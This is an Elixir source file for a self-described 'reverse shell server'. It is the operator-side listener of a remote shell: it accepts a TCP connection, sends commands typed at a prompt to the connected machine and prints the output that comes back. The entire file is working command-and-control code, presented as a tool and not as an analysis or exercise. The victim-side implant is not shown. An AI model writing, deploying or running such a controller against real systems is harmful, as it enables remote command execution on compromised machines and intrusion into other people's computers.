defmodule Ers.Server do
  use Application

  import Ers.Server.Utils.IO

  @module       __MODULE__
  @supervisor   __MODULE__.Supervisor
  @accept_opts  [:binary, packet: :line, active: false, reuseaddr: true]
  @port         Application.get_env(:ers_server, :port)
  @prompt       Application.get_env(:ers_server, :prompt)
  @version      Ers.Server.Mixfile.project[:version]
  @end_of_input Application.get_env(:ers_server, :end_of_input) <> "\n"
  @timeout      Application.get_env(:ers_server, :timeout) <> "\n"

  def start(_type, _args) do
    import Supervisor.Spec, warn: false

    children = [worker(Task, [@module, :listen, [@port]])]

    put_success("<<<Elixir reverse shell server v#{@version}>>>")

    opts = [strategy: :one_for_one, name: @supervisor]
    Supervisor.start_link(children, opts)
  end

  def listen(@port) do
    {:ok, socket} = :gen_tcp.listen(@port, @accept_opts)

    put_info("Listening on @port #{@port}...")

    accept(socket)
  end

  def accept(socket) do
    {:ok, client} = :gen_tcp.accept(socket)

    put_success("Connection from #{which_addr(client)}")

    process(client, :send)
  end

  def process(client, :send) do
    cmd = IO.gets @prompt
    :gen_tcp.send(client, cmd <> "\n")

    process(client, :read)
  end

  def process(client, :read) do
    case :gen_tcp.recv(client, 0) do
      {:ok, resp}        -> process(client, resp)
      {:error, :closed}  -> put_info("Client disconnected")
    end
  end

  def process(client, resp) when is_bitstring(resp) do
    case resp do
      @end_of_input -> process(client, :send)
      _             -> handle_message(client, resp)
    end
  end

  def handle_message(client, msg) do
    case msg do
      @timeout -> put_error("timeout")
      _        -> put_msg(String.rstrip(msg))
    end

    process(client, :read)
  end

  def which_addr(client) do
    {:ok, {addr, _}} = :inet.peername(client)
    addr |> :erlang.tuple_to_list() |> Enum.join(".")
  end
end
